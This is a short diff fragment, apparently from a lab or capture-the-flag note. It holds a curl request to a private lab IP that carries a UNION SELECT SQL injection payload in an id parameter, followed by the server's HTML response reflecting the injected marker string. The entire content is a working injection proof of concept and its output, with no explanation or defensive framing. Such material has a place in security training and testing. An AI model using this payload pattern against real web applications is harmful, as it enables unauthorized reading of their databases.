@@ -1,0 +1,8 @@
+$ curl -s "http://10.10.10.10/item?id=1%20UNION%20SELECT%201,'0b0lm4rk3r',3-- -"
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+<html><body>
+  <h2>Product: 0b0lm4rk3r</h2>
+  <p>Price: 3</p>
+</body></html>
